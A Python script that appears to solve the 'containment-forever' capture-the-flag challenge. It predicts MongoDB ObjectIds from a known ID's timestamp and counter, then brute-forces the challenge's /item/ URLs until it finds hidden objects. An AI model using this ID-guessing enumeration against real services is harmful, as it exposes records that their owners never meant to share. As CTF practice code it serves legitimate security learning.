from datetime import datetime
import time
import requests

strs = '5e70da94d7b1600013655bb5'

_ts = int(strs[:8],16)
_rand_h = strs[8:(8+10)]
_count = int(strs[(8+10):], 16)


def tsToDs(ts):
    #timestamp to datetime
    return datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
def dsToTs(ds):
    #datetime to timestamp
    obj_datetime = datetime.strptime(ds, '%Y-%m-%d %H:%M:%S')
    return int(time.mktime(obj_datetime.timetuple()))

def getDifDs(end, start):
    #parameter format: 2020-03-17 07:11:32
    ts = dsToTs(end)
    ts2 = dsToTs(start)
    return ts - ts2

start = '2020-03-17 14:11:32'
end = '2020-03-17 14:11:32'
dif_flag1 = getDifDs('2020-03-21 09:13:22', start)
dif_flag2 = getDifDs('2020-04-13 15:50:18', start)
print ('dif : ' + str(dif_flag1))


obj_ts_flag = hex(_ts + dif_flag1)[2:]
obj_ts_flag2 = hex(_ts + dif_flag2)[2:]


url = 'http://containment-forever.sharkyctf.xyz/item/'

import os.path
def findObj(obj):
    for c in range(0x200):
        payload = obj + _rand_h + hex(_count+c)[2:]
        print ('[*] payload: {' + payload + '}')
        res = requests.get(url + payload)
        if res.text.find('TypeError') == -1:
            print ('found!!')
            print ('payload: ' + payload)
            return payload

key = []
key.append(findObj(obj_ts_flag))
key.append(findObj(obj_ts_flag2))

print ('Enter this payload to get flag')
print (key)
